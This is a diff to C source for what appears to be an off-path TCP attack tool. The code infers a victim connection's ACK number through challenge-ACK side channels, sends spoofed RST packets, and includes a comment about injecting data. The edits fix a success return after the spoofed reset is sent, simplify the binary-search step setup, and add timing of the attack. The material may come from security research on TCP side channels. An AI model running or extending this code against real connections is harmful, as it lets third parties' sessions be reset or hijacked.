@@ -1291,7 +1291,7 @@ int infer_ack_number(void)
 {
 	struct timeval round_start;
 	volatile conn_t *spoof = &(g_ctx.spoof);
-	int step = -1;
+	int step = 0;
 	/* printing status */
 	u_long pr_start, pr_end;
 	/* binary search vars */
@@ -1302,14 +1302,6 @@ int infer_ack_number(void)
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
-
-		/* initialize whatever is needed */
-		if (step == -1) {
-			/* step 1 doesn't require any initialization as it's hardcoded in g_acks */
-			step = 0;
-
-			/* step 2 init happens after the first four divisions are tested */
-		}
 
 		/* send packets depending on the step we're in */
 		if (step == 0) {
@@ -1448,6 +1440,7 @@ int infer_ack_number(void)
 int conduct_offpath_attack(void)
 {
 	pthread_t rth;
+	struct timeval attack_start, attack_end, diff;
 
 	/* generate the packet we'll send over and over to elicit challenge ACKs */
 	if (!prepare_rst_packet(&g_rst_pkt))
@@ -1463,8 +1456,10 @@ int conduct_offpath_attack(void)
 	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
 		if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
 			return 0;
-		return 0;
+		return 1;
 	}
+
+	gettimeofday(&attack_start, NULL);
 
 	/* synchronize our processing with the remote host's clock */
 	if (!sync_time_with_remote())
@@ -1486,6 +1481,10 @@ int conduct_offpath_attack(void)
 
 		// inject some stuff?
 	}
+
+	gettimeofday(&attack_end, NULL);
+	timersub(&attack_end, &attack_start, &diff);
+	printf("[*] Attack took %lu %lu seconds\n", diff.tv_sec, diff.tv_usec);
 
 	return 1;
 }
